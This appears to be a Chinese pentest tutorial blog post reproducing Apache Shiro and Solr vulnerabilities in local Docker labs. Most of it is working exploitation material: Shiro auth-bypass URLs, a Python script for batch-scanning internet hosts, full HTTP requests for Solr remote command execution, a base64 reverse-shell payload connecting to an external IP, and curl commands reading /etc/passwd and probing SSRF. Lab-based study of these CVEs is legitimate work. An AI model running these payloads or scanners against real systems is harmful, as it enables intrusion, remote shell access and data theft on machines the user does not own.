![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135114881-1263518202.png)

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135123106-300002005.png)

```plain
#知识点：
中间件及框架列表：
IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等
1、开发框架-PHP-Laravel-Thinkphp
2、开发框架-Javaweb-St2-Spring
3、开发框架-Python-django-Flask
4、开发框架-Javascript-Node.js-JQuery
5、其他框架-Java-Apache Shiro&Apache Sorl

常见语言开发框架：
PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等
JAVA：Spring MyBatis Hibernate Struts2 Springboot等
Python：Django Flask Bottle Turbobars Tornado Web2py等
Javascript：Vue.js Node.js Bootstrap JQuery Angular等

#章节内容：
常见中间件的安全测试：
1、配置不当-解析&弱口令
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击
4、安全应用-框架特定安全漏洞

#前置知识：
-中间件安全测试流程：
1、判断中间件信息-名称&版本&三方
2、判断中间件问题-配置不当&公开漏洞
3、判断中间件利用-弱口令&EXP&框架漏洞

-应用服务安全测试流程：见图
1、判断服务开放情况-端口扫描&组合应用等
2、判断服务类型归属-数据库&文件传输&通讯等
3、判断服务利用方式-特定漏洞&未授权&弱口令等

-开发框架组件安全测试流程：
1、判断常见语言开发框架类型
2、判断开发框架存在的CVE问题
3、判断开发框架CVE漏洞利用方式
```

- ApacheShiro-组件框架安全

```plain
Apache Shiro是一个强大且易用的Java安全框架，用于身份验证、授权、密码和会话管理
判断：大多会发生在登录处，返回包里包含remeberMe=deleteMe字段，主要用到java中
搜索：header="remeberMe=deleteMe"
在cookie中带有：Set-Cookie: remeberMe=deleteMe; Path=/; Max-Age=0; Expires=Tue, 26-Apr-2022 22:23:24 GMT
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135137826-1803948115.png)

```plain
漏洞：https://avd.aliyun.com/search?q=shiro
Apache Shiro <= 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483】
Apache Shiro < 1.3.2 验证绕过漏洞【CVE-2016-2807】
Apache Shiro < 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442】
Apache Shiro < 1.5.2 验证绕过漏洞 【CVE-2020-1957】
Apache Shiro < 1.5.3 验证绕过漏洞 【CVE-2020-11989】
Apahce Shiro < 1.6.0 验证绕过漏洞 【CVE-2020-13933】
Apahce Shiro < 1.7.1 权限绕过漏洞 【CVE-2020-17523】
1、CVE_2016_4437 Shiro-550+Shiro-721
环境：https://vulfocus.cn/#/dashboard?image_id=df02a278-761c-483b-913f-9f8142b9a19f

在GUI_Tools中也有他检测的漏洞利用。先点击检测当前秘钥，然后爆破秘钥，在接着爆破利用链及回显。回显结果： 发现构造链:CommonsCollections2  回显方式: TomcatEcho然后在选择相对应的。可以执行命令。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135138430-111787664.png)

```plain
2、CVE-2020-11989
漏洞下载地址：https://github.com/jweny/shiro-cve-2020-17523
影响范围：Apache Shiro < 1.7.1

下载源码，用idea打开，直接启动，默认开放9090端口，访问：http://127.0.0.1:9090/
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135138393-19085403.png)

```plain
默认加载的地方：org.test.springbootshiro.SpringbootShiroApplication
点击springbookshiroapplication 然后edit
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135138272-1136689903.png)

```plain
在\src\main\java\org\test\springbootshiro目录下，有LoginController.java，SpringbootShiroApplication.java两个文件

在LoginController.java中，访问/doLogin，尝试输入账号密码，成功提示success，失败提示failed
账号密码配置文件是在MyRealm.java文件中配置：java 123

当直接访问http://127.0.0.1:9090/admin/xxx的时候，地址就自动换成http://127.0.0.1:9090/login，显示内容为please login!，就是要登录的意思。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135137976-1003829497.png)

```plain
尝试登录一下，访问http://127.0.0.1:9090/doLogin页面，POST发送username=java&password=123，然后再次访问admin页面http://127.0.0.1:9090/admin/xxx，这里就不需要登录了。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135138798-1037130784.png)

```plain
这个漏洞是直接访问：http://127.0.0.1:9090/admin/%20
这样就可以直接登录到后台。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139562-1643975338.png)

```plain
如果在白盒的角度分析的话，这个漏洞是怎么产生的。在LoginController.java这个文件中，这个文件引用了一个包：import org.apache.shiro.SecurityUtils;
在pom.xml配置文件中：
        <dependency>
            <groupId>org.apache.shiro</groupId>
            <artifactId>shiro-web</artifactId>
            <version>1.7.0</version>
        </dependency>
 
引用了这个框架org.apache.shiro，版本是1.7.0符合漏洞版本。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139492-1218347151.png)

```plain
3、CVE-2020-1957
影响范围：Apache Shiro < 1.5.3

启动环境：
cd /vulhub-master/shiro$ cd CVE-2020-1957
sudo docker-compose up -d

访问：http://192.168.233.128:8080/，点击login跳转：http://192.168.233.128:8080/login.html
如果直接访问：http://192.168.233.128:8080/xxx/..;/admin/就相当于直接进入了后台目录
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135138953-623253970.png)

```plain
也可以在网上写python代码来进行测试：
语法：app="APACHE-Shiro"

import os
import requests

for url in open('ips.txt'):
	url=url.strip()
	url='http://'+url+'/;/login'
	try:
		code=requests.get(url).status_code
		print(code)
		if code==200:
			print(url+'|ok')
	except Exception as e:
		pass
```

- ApacheSolr-组件框架安全

```plain
Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。Solr是一个高性能，采用Java5开发，基于Lucene的全文搜索服务器。

漏洞：https://avd.aliyun.com/search?q=solr
远程命令执行RCE（CVE-2017-12629）
远程命令执行XXE（CVE-2017-12629）
任意文件读取AND命令执行（CVE-2019-17558）
远程命令执行漏洞(CVE-2019-0192)
远程命令执行漏洞(CVE-2019-0193)
未授权上传漏洞(CVE-2020-13957)
Apache Solr SSRF (CVE-2021-27905)
1、远程命令执行RCE（CVE-2017-12629）
影响版本：Apache solr<7.1.0版本
语法：app="APACHE-Solr" && title=="Solr Admin"

启动环境：
cd /vulhub-master/solr/CVE-2017-12629-RCE
sudo docker-compose up -d

参考：https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/

访问：http://192.168.233.128:8983/solr/#/
访问特定地址进行抓包：
http://192.168.233.128:8983/solr/demo/config
POST提交：{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "touch /tmp/success"]}}
执行的命令是：touch /tmp/success
数据包：
POST /solr/demo/config HTTP/1.1
Host: 192.168.233.128:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 158

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "touch /tmp/success"]}}
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139168-1986995624.png)

```plain
但是失败了，然后按照官方的原封不动的发：
POST /solr/demo/config HTTP/1.1
Host: 192.168.233.128:8983
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 158

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "touch /tmp/success"]}}
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135138670-1073635610.png)

```plain
然后在访问特定地址http://192.168.233.128:8983/solr/demo/update
POST提交：[{"id":"test"}]
抓取数据包：
POST /solr/demo/update HTTP/1.1
Host: 192.168.233.128:8983
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

[{"id":"test"}]

修改数据包：
POST /solr/demo/update HTTP/1.1
Host: 192.168.233.128:8983
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15

[{"id":"test"}]
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139387-1147187456.png)

```plain
进入docker环境查看是否成功：
进入：sudo docker-compose exec solr bash
查看：ls /tmp
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139179-2129130764.png)

```plain
2、任意文件读取AND命令执行（CVE-2019-17558）
影响版本：Apache Solr 5.0.0版本至8.3.1

环境：https://vulfocus.cn/#/dashboard?image_id=0c32e104-8afe-433d-8b10-904d18704bef

利用脚本：https://github.com/jas502n/solr_rce

这个脚本采用了python2开发，用到虚拟机的python2环境。
执行命令：
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139544-1861208892.png)

```plain
也可以进行批量测试，修改solr_rce.py文件
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139001-325338163.png)

```plain
3、远程命令执行漏洞(CVE-2019-0193)
影响版本：Apache Solr < 8.2.0版本
需要登录才能利用。

启动环境：
cd /vulhub-master/solr/CVE-2019-0193
sudo docker-compose up -d


参考：https://vulhub.org/#/environments/solr/CVE-2019-0193/

访问：http://192.168.233.128:8983/solr/#/
默认是没有test的，在执行：sudo docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139030-1679675433.png)

```plain
选择test-->dataimport-->debug-->configuration-->debug mode
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139536-322609774.png)

```plain
把poc进行复制：
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><![CDATA[
          function poc(){ java.lang.Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=}|{base64,-d}|{bash,-i}");
          }
  ]]></script>
  <document>
    <entity name="stackoverflow"
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>

其中YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==是反弹命令base64编码。
反弹命令：bash -i >& /dev/tcp/175.178.151.29/5566 0>&1
base64：YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMTc4LjE1MS4yOS81NTY2IDA+JjE=

然后在点击execute with this configuration
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139477-792724332.png)

```plain
4、Apache Solr 文件读取&SSRF (CVE-2021-27905)

启动环境：
cd /vulhub-master/solr/Remote-Streaming-Fileread
sudo docker-compose up -d

访问：http://192.168.233.128:8983/solr/#!/
1、获取数据库名
http://192.168.233.128:8983/solr/admin/cores?indexInfo=false&wt=json
数据库名：demo
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139676-1044892560.png)

```plain
2、访问触发
curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' --data-binary $'{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' \
    $'http://192.168.233.128:8983/solr/demo/config'
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135139711-1623183271.png)

```plain
3、任意文件读取
curl -i -s -k 'http://192.168.233.128:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913135140097-1647594878.png)

```plain
为什么说也是ssrf漏洞，是因为用到了file协议去读取，这样也可以进行内网探针，比如把file协议进行修改为http协议。看支不支持http协议可以用dnslog来进行判断。
curl -i -s -k 'http://192.168.233.128:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=http://2e8m2t.dnslog.cn'

执行能接受到反弹，所以支持http协议。
```